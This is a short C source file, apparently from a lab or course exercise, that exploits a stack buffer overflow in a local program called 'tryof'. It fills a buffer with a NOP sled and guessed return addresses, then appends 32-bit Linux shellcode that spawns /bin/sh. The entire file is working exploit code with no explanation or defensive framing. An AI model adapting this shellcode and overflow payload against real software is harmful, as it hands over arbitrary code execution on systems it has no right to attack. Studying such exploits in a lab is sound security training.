/*
 * tryof_exploit.c
 * Copyright (C) 2018 lhuang <lhuang9703@gmail.com>
 *
 * Distributed under terms of the MIT license.
 */

#include <stdio.h> 
#include <stdlib.h> 
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

char shellcode[] = 
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh"; 

int main(int argc,char *argv[]){ 
      char buf[888]; 
      unsigned long ret ,p; 
      int i; 

      p = buf; 
      ret = p + 456; 

     memset(buf, 0x90, sizeof(buf)); 

     for (i = 0; i < 344; i += 4) 
           *(long *)&buf[i] = ret; 

     memcpy(buf + 444 + i, shellcode, strlen(shellcode)); 

     execl("./tryof", "tryof", buf, NULL); 

     return 0; 
} 
